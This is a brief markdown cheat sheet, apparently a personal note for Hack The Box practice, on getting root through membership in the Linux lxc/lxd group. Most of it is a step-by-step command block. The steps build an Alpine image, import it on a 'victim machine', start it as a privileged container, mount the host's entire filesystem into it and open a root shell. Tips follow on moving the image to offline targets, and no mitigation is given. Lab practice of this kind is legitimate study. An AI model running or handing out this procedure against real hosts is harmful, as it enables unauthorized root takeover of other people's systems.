# Priv Esc If You're in Group LXC  



* What is LXC and LXD?  
  <blockquote>
  LXC is the well-known and heavily tested low-level Linux container runtime. It is in active development since 2008 and has proven itself in critical production environments world-wide. LXD is a next generation system container manager. that offers a user experience similar to virtual machines but using Linux containers instead.

  The LXC/LXD groups are used to allow users to create and manage Linux containers. These can be exploited by creating a root-level privilege container from the current file system and interacting with it, executing /bin/sh and therefore starting a root shell.
  </blockquote>

* The exploit described as briefly as one could  
  <blockquote>
  So basically, the attack is quite simple. The attack is to run OS in the container on top of the victim OS, where we mount the entire victim OS drive to the container with root access in the container
  </blockquote>


* We can create an alpine image and use the security.privileged=true flag to get root privileges   

  ```cli
  # build a simple alpine image
  git clone https://github.com/saghul/lxd-alpine-builder
  cd lxd-alpine-builder
  sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
  sudo ./build-alpine -a i686

  # before running the image, start and configure the lxd storage pool as default 
  lxd init

  # import the image
  lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

  # run the image
  lxc init myimage mycontainer -c security.privileged=true

  # mount the /root into the image
  lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

  # interact with the container
  lxc start mycontainer
  lxc exec mycontainer /bin/sh
  ```  

* This is the way to be used when we don't have any internet which is always the case with HTB boxes.
* I created the image (.tar.gz) on my box and then transferred it to the victim's box.   

  <blockquote>
  The easiest way to exploit this misconfiguration is to build an image of Alpine, a lightweight Linux distribution, and start it using the security.privileged=true flag, forcing the container to interact as root with the host filesystem and therefore allowing to read/write/execute root-level files
  </blockquote>


<br/><br/>